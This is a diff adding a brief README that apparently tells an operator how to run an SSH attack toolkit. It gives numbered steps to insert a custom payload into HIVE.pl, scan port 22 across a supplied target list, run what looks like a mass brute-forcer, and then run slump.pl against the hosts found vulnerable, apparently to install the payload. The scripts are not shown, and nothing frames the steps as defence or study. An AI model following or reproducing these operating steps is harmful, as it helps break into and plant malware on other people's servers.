@@ -1,0 +1,15 @@
+change payload to your payload in HIVE.pl
+
+1. sh HIVE.sh          if it asks for [Yes] press enter
+                          if it asks for [autodetect] press enter
+2. sh SUDO.sh
+
+3  .cpan force install Parallel::ForkManager
+
+4. chmod 777 * 
+
+5. SUDO -p22 -w (your list) -o mfu.txt -B100M
+
+6. ./update 2500 
+
+7. perl slump.pl vuln.txt
